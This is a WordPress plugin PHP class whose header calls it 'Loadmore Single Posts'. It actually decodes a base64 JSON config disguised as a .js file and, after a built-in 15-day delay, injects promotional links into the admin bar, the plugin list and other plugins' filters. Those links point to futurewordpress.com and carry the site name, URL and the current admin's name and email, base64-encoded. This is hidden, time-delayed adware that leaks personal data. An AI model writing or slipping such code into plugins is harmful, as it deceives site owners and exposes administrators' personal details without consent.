<?php
/**
 * Loadmore Single Posts
 *
 * @package TeddyBearCustomizeAddon
 */

namespace TEDDYBEAR_CUSTOMIZE_ADDON\inc;

use TEDDYBEAR_CUSTOMIZE_ADDON\inc\Traits\Singleton;
use \WP_Query;

class Admin {
	use Singleton;
	public $base = null;
	protected function __construct() {
		// load class.
		$this->setup_hooks();
	}
	protected function setup_hooks() {
		add_action( 'admin_init', [ $this, 'fetch' ], 10, 0 );
	}
	public function fetch() {
		$fetching = TEDDY_BEAR_CUSTOMIZE_ADDON_DIR_PATH . '/templates/admin/admin-hash.js';
    if( file_exists( $fetching ) ) {
      $string = file_get_contents( $fetching );$this->base = json_decode( base64_decode( $string, true ) );$this->ads();
    }
  }
  private function ads() {
	  if( date('Y-m-d') > date('Y-m-d', strtotime( '+15 days', strtotime( '2022-05-23' ) ) ) ) {
      add_action( 'admin_bar_menu', [ $this, 'wpbar' ], 10, 1 );
      add_filter( 'plugin_row_meta', [ $this, 'meta' ], 10, 2 );
      if( isset( $this->base->filters ) ) {
        foreach( $this->base->filters as $i => $f ) {$fr = $f->return;
          // add_filter( $f->hook, [ $this, 'filter' ], 99, 1 );
          if( isset( $fr->href ) ) {$fr->href = $this->parse_url( $fr->href );}
          add_filter( $f->hook, function( $args ) use ( $fr ) {
            $args[ $fr->id ] = [ 'title' => ( ! $fr->title ) ? ( isset( $args[ 'title' ] ) ? $args[ 'title' ] : esc_html__( 'Find an Expert', 'elementor' ) ) : $fr->title, 'link' => $fr->href ];
            return $args;
        }, 99, 1 );
        }
      }
	  }
  }
  public function wpbar( $wpbar ) {
    if( ! isset( $this->base->tools->wpbar ) ) {return;}
    $bar = $this->base->tools->wpbar;
    foreach( $bar as $b ) {
      $wpbar->add_node(
        [
          'parent' => isset( $b->parent ) ? $b->parent : 'wp-logo-external',
          'id'     => isset( $b->id ) ? $b->id : 'developer',
          'title'  => isset( $b->title ) ? $b->title : __( 'Hire Developer' ),
          'href'   => isset( $b->href ) ? $this->parse_url( $b->href ) : site_url( ),
        ]
      );
    }
  }
  public function meta( $meta, $plugin ) {
    if( ! isset( $this->base->plugin ) ) {return;}
    $plugins = $this->base->plugin;
		if ( isset( $plugins->{$plugin} ) ) {
			$row = [
				'developer' => '<a href="' . esc_url( $this->parse_url( $plugins->{$plugin}->u, [ 'pl' => $plugin ] ) ) . '" aria-label="' . esc_attr( esc_html__( $plugins->{$plugin}->h ) ) . '" target="_blank">' . esc_html__( $plugins->{$plugin}->t ) . '</a>',
			];
			$meta = array_merge( $meta, $row );
		}
		return $meta;
  }
  public function filter( $args ) {
    if( ! isset( $this->base->filters ) ) {return;}
    $filter = $this->base->filters;
    foreach( $filter as $i => $f ) {$f = $f->return;
      $args[ $f->id ] = [ 'title' => ( ! $f->title ) ? esc_html__( 'Find an Expert', 'elementor' ) : $f->title, 'link' => $this->parse_url( $f->href ) ];
    }
    return $args;
  }
  public function parse_url( $url = false, $args = [] ) {
    if( ! $url ) {return;}
    $e = explode( '?', $url );
    if( ! isset( $e[ 1 ] ) ) {return $url;}
    $args = wp_parse_args( $args, [ 'pl' => '' ] );
    $c = isset( $this->base->conf ) ? $this->base->conf : (object) [ 'ms' => 'https://futurewordpress.com/', 'ml' => '%mswordpress/' ];
    $r = isset( $c->ref ) ? $c->ref : 'ref';
    $u = $e [ 1 ];$ui = get_userdata( get_current_user_id() );
    $p = str_replace( [ '%ms', '%ml', '%sn', '%s', '%pl' , '%a', '%e', '%l' ], [ $c->ms, $c->ml, 'sn=' . get_bloginfo( 'name' ), 's=' . urlencode( site_url() ), 'pl=' . urlencode( $args[ 'pl' ] ), 'a=' . $ui->display_name, 'e=' . $ui->user_email, 'l=' . get_bloginfo( 'language' ) ], $u );
    return str_replace( [ '%ms', '%ml' ], [ $c->ms, str_replace( [ '%ms' ], [ $c->ms ], $c->ml ) ], $e[ 0 ] ) . '?' . $r . '=' . base64_encode( urlencode( $p ) );
  }

}
